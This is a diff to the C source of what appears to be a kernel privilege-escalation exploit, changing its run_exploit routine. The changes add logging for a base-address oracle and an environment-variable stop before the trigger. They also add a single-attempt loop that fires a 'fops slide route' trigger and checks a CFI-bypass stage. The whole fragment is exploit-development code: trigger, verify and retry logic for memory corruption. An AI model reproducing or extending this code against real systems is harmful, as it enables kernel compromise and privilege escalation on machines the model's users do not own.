@@ -476,6 +476,19 @@ int run_exploit(int argc, char **argv) {
   if (!page_base) {
     return 1;
   }
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
+  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
+    pr_warning("diagnostic stop after fops prepare; trigger not entered\n");
+    if (pipe_prepare_child > 0) {
+      SYSCHK(kill(pipe_prepare_child, SIGKILL));
+      SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
+      pipe_prepare_child = -1;
+    }
+    return 2;
+  }
+  pr_info("app fops stage=trigger-enter base=%016zx\n", page_base);
+#endif
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
   int fops_oracle_triggered =
       app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
@@ -494,6 +507,7 @@ int run_exploit(int argc, char **argv) {
           APP_FOPS_PSELECT_DELAY_USEC);
   return 1;
 #else
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
     APP_FOPS_REUSE_VERIFIED_PAGE
   const int fops_fresh_page_attempts = 1;
@@ -514,6 +528,10 @@ int run_exploit(int argc, char **argv) {
       }
     }
     int triggered = app_trigger_fops_slide_route();
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
+            attempt, triggered);
+#endif
     int verified = 0;
 #if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
     APP_FOPS_DEFER_ALIAS_READBACK
@@ -557,6 +575,20 @@ int run_exploit(int argc, char **argv) {
             "page attempt=%d/%d\n",
             attempt, fops_fresh_page_attempts);
   }
+#else
+  for (int attempt = 1; attempt <= 1; attempt++) {
+    int triggered = app_trigger_fops_slide_route();
+    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
+            attempt, triggered);
+    int verified = triggered && try_cfi_stage();
+    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
+            "step=%d errno=%d\n",
+            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+    if (verified || cfi_dirty_seen) {
+      break;
+    }
+  }
+#endif
 #endif
 #else
   run_main_route_threads();
